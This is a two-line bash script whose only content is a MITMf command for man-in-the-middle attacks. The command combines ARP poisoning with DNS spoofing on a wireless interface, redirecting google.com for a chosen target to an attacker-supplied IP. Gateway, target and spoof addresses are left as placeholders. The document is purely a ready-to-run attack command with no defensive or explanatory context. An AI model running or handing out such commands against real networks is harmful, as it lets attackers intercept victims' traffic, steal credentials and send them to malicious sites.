#!/bin/bash
# Spoof DNS along with traditional ARP-Poisoning we would run:

python mitmf.py  --spoof --arp --iface wlan0 --gateway IP --target IP --dns --domain google.com --dnsip IP
